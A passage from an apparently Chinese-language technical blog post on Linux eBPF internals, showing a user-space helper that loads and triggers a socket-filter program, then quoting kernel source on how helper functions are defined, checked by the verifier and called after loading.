</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf</span><span style="color:#c0c5ce;">(BPF_MAP_GET_NEXT_KEY, &amp;attr);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">BPF_LOG_BUF_SZ </span><span style="color:#d08770;">0x100000
</span><span style="color:#b48ead;">static char</span><span style="color:#c0c5ce;"> bpf_log_buf[BPF_LOG_BUF_SZ] = { &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39; };
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/**
</span><span style="color:#65737e;"> * @brief Run a bpf prog by attaching to a pair of sockets and sending packets
</span><span style="color:#65737e;"> * 
</span><span style="color:#65737e;"> * @param insns bpf program to be run
</span><span style="color:#65737e;"> * @param insn_cnt number of bpf instructions
</span><span style="color:#65737e;"> * @return int 0 for success, others for failure
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static int
</span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *</span><span style="color:#bf616a;">insns</span><span style="color:#c0c5ce;">, uint64_t </span><span style="color:#bf616a;">insn_cnt</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">log_level</span><span style="color:#c0c5ce;">, 
</span><span style="color:#c0c5ce;">             </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">print_log</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*err_msg = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sock_fd[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], prog_fd;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* socket pair to trigger eBPF prog */
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">socketpair</span><span style="color:#c0c5ce;">(AF_UNIX, SOCK_DGRAM, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sock_fd);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        err_msg = &quot;</span><span style="color:#a3be8c;">FAILED to creat socket pair!</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_socket;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(bpf_log_buf, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(bpf_log_buf));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* load bpf prog into kernel */
</span><span style="color:#c0c5ce;">    prog_fd = </span><span style="color:#8fa1b3;">bpf_load_prog</span><span style="color:#c0c5ce;">(BPF_PROG_TYPE_SOCKET_FILTER, insns, insn_cnt, 
</span><span style="color:#c0c5ce;">                            bpf_log_buf, BPF_LOG_BUF_SZ, log_level);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(prog_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        ret = prog_fd;
</span><span style="color:#c0c5ce;">        err_msg = &quot;</span><span style="color:#a3be8c;">FAILED to load bpf program!</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_bpf_load;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* attach bpf prog to a socket */
</span><span style="color:#c0c5ce;">    ret = </span><span style="color:#8fa1b3;">setsockopt</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">],SOL_SOCKET,SO_ATTACH_BPF, &amp;prog_fd,sizeof(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        err_msg = &quot;</span><span style="color:#a3be8c;">FAILED to attach the bpf program!</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_bpf_attach;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* send a packet to trigger bpf */
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], &quot;</span><span style="color:#a3be8c;">arttnba3</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* output the log */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(print_log != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(bpf_log_buf);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* recycle resource */
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(prog_fd);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">err_bpf_attach:
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(prog_fd);
</span><span style="color:#c0c5ce;">err_bpf_load:
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(bpf_log_buf);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(sock_fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">err_socket:
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">err_print</span><span style="color:#c0c5ce;">(err_msg);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#endif
</span></pre>
<h2 id="ebpffu-zhu-han-shu">ebpf辅助函数</h2><h3 id="ding-yi">定义</h3><p><code>___BPF_FUNC_MAPPER</code>为每个 eBPF Helper 分配唯一的 <code>bpf_func_id</code>
自动生成 <code>bpf_func_proto</code> 结构体数组，包含所有 Helper 的参数和返回值类型</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">// include/uapi/linux/bpf.h
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">___BPF_FUNC_MAPPER</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">FN</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">ctx</span><span style="color:#c0c5ce;">...)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(unspec, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, ##ctx)				\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(map_lookup_elem, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(map_update_elem, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(map_delete_elem, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(probe_read, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(ktime_get_ns, </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(trace_printk, </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(get_prandom_u32, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(get_smp_processor_id, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, ##ctx)		\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(skb_store_bytes, </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(l3_csum_replace, </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(l4_csum_replace, </span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(tail_call, </span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">FN</span><span style="color:#c0c5ce;">(clone_redirect, </span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">, ##ctx)			\
</span><span style="color:#c0c5ce;">	...
</span></pre>
<p>声明函数原型</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_func_proto bpf_map_lookup_elem_proto = {
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">func		</span><span style="color:#c0c5ce;">= bpf_map_lookup_elem,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">gpl_only	</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">false</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">pkt_access	</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">ret_type	</span><span style="color:#c0c5ce;">= RET_PTR_TO_MAP_VALUE_OR_NULL,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg1_type	</span><span style="color:#c0c5ce;">= ARG_CONST_MAP_PTR,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg2_type	</span><span style="color:#c0c5ce;">= ARG_PTR_TO_MAP_KEY,
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>实现内核逻辑</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">BPF_CALL_2</span><span style="color:#c0c5ce;">(bpf_map_lookup_elem, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *, map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*, key)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">WARN_ON_ONCE</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">rcu_read_lock_held</span><span style="color:#c0c5ce;">() &amp;&amp; !</span><span style="color:#8fa1b3;">rcu_read_lock_trace_held</span><span style="color:#c0c5ce;">() &amp;&amp;
</span><span style="color:#c0c5ce;">		     !</span><span style="color:#8fa1b3;">rcu_read_lock_bh_held</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">) map-&gt;ops-&gt;</span><span style="color:#8fa1b3;">map_lookup_elem</span><span style="color:#c0c5ce;">(map, key);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>注册到系统</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">const struct bpf_func_proto *
</span><span style="color:#c0c5ce;">bpf_base_func_proto(enum bpf_func_id func_id)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	switch (func_id) {
</span><span style="color:#c0c5ce;">	case BPF_FUNC_map_lookup_elem:
</span><span style="color:#c0c5ce;">		return &amp;bpf_map_lookup_elem_proto;
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>外部变量声明​​</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">extern const struct</span><span style="color:#c0c5ce;"> bpf_func_proto bpf_map_update_elem_proto;
</span></pre>
<h3 id="diao-yong-liu-cheng">调用流程</h3><p><code>do_check()</code>函数中
当opcode类型为BPF_CALL
且src_reg类型不是BPF_PSEUDO_CALL或BPF_PSEUDO_KFUNC_CALL
调用<code>check_helper_call()</code></p>
<p>eBPF程序类型和不同<code>bpf_verifier_ops</code>绑定
对于常用的<code>BPF_PROG_TYPE_SOCKET_FILTER</code>，其<code>bpf_verifier_ops</code>为<code>sk_filter_verifier_ops</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_verifier_ops sk_filter_verifier_ops = {
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">get_func_proto		</span><span style="color:#c0c5ce;">= sk_filter_func_proto,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">is_valid_access	</span><span style="color:#c0c5ce;">= sk_filter_is_valid_access,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">convert_ctx_access	</span><span style="color:#c0c5ce;">= bpf_convert_ctx_access,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">gen_ld_abs		</span><span style="color:#c0c5ce;">= bpf_gen_ld_abs,
</span><span style="color:#c0c5ce;">};
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">check_helper_call</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_verifier_env *</span><span style="color:#bf616a;">env</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn *</span><span style="color:#bf616a;">insn</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			     </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">insn_idx_p</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(env-&gt;ops-&gt;get_func_proto)
</span><span style="color:#c0c5ce;">		fn = env-&gt;ops-&gt;</span><span style="color:#8fa1b3;">get_func_proto</span><span style="color:#c0c5ce;">(func_id, env-&gt;prog);
</span><span style="color:#c0c5ce;">	...
</span></pre>
<p>对应<code>get_func_proto</code>函数指针<code>sk_filter_func_proto()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static const struct</span><span style="color:#c0c5ce;"> bpf_func_proto *
</span><span style="color:#8fa1b3;">sk_filter_func_proto</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_func_id </span><span style="color:#bf616a;">func_id</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_prog *</span><span style="color:#bf616a;">prog</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(func_id) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_skb_load_bytes:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_skb_load_bytes_proto;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_skb_load_bytes_relative:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_skb_load_bytes_relative_proto;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_get_socket_cookie:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_get_socket_cookie_proto;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_get_socket_uid:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_get_socket_uid_proto;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_perf_event_output:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_skb_event_output_proto;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf_sk_base_func_proto</span><span style="color:#c0c5ce;">(func_id);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>sk_filter_func_proto()</code>函数根据<code>func_id</code>返回对应<code>bpf_func_proto</code>结构
这一块实现直接用多级switch_case实现
注意这里辅助函数的调用也会对权限做一些检查</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static const struct</span><span style="color:#c0c5ce;"> bpf_func_proto *
</span><span style="color:#8fa1b3;">sk_filter_func_proto</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_func_id </span><span style="color:#bf616a;">func_id</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_prog *</span><span style="color:#bf616a;">prog</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(func_id) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_skb_load_bytes:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_skb_load_bytes_proto;
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf_sk_base_func_proto</span><span style="color:#c0c5ce;">(func_id);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static const struct</span><span style="color:#c0c5ce;"> bpf_func_proto *
</span><span style="color:#8fa1b3;">bpf_sk_base_func_proto</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_func_id </span><span style="color:#bf616a;">func_id</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_func_proto *func;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(func_id) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_skc_to_tcp6_sock:
</span><span style="color:#c0c5ce;">		func = &amp;bpf_skc_to_tcp6_sock_proto;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf_base_func_proto</span><span style="color:#c0c5ce;">(func_id);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">perfmon_capable</span><span style="color:#c0c5ce;">())
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> func;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_func_proto *
</span><span style="color:#8fa1b3;">bpf_base_func_proto</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_func_id </span><span style="color:#bf616a;">func_id</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(func_id) {
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_map_lookup_elem:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_map_lookup_elem_proto;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> BPF_FUNC_map_update_elem:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">&amp;bpf_map_update_elem_proto;
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">bpf_capable</span><span style="color:#c0c5ce;">())
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(func_id) {
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">perfmon_capable</span><span style="color:#c0c5ce;">())
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(func_id) {
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>最终proto结构中<code>func</code>指针对应上实现</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">BPF_CALL_4</span><span style="color:#c0c5ce;">(bpf_map_update_elem, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *, map, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*, key,
</span><span style="color:#c0c5ce;">	   </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*, value, u64, flags)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">WARN_ON_ONCE</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">rcu_read_lock_held</span><span style="color:#c0c5ce;">() &amp;&amp; !</span><span style="color:#8fa1b3;">rcu_read_lock_trace_held</span><span style="color:#c0c5ce;">() &amp;&amp;
</span><span style="color:#c0c5ce;">		     !</span><span style="color:#8fa1b3;">rcu_read_lock_bh_held</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> map-&gt;ops-&gt;</span><span style="color:#8fa1b3;">map_update_elem</span><span style="color:#c0c5ce;">(map, key, value, flags);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_func_proto bpf_map_update_elem_proto = {
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">func		</span><span style="color:#c0c5ce;">= bpf_map_update_elem,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">gpl_only	</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">false</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">pkt_access	</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">ret_type	</span><span style="color:#c0c5ce;">= RET_INTEGER,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg1_type	</span><span style="color:#c0c5ce;">= ARG_CONST_MAP_PTR,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg2_type	</span><span style="color:#c0c5ce;">= ARG_PTR_TO_MAP_KEY,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg3_type	</span><span style="color:#c0c5ce;">= ARG_PTR_TO_MAP_VALUE,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">arg4_type	</span><span style="color:#c0c5ce;">= ARG_ANYTHING,
</span><span style="color:#c0c5ce;">};
</span></pre>
<h2 id="loadhou-ebpfdiao-yong-lu-jing">load后ebpf调用路径</h2><p>对于<code>BPF_PROG_TYPE_SOCKET_FILTER</code>
通过将socket attach到加载的eBPF程序，并对socket发包 触发调用链</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">unix_dgram_sendmsg()
</span><span style="color:#c0c5ce;">	sk_filter()
</span><span style="color:#c0c5ce;">		sk_filter_trim_cap()
</span><span style="color:#c0c5ce;">			bpf_prog_run_save_cb()
</span><span style="color:#c0c5ce;">				__bpf_prog_run_save_cb()
</span><span style="color:#c0c5ce;">					bpf_prog_run()
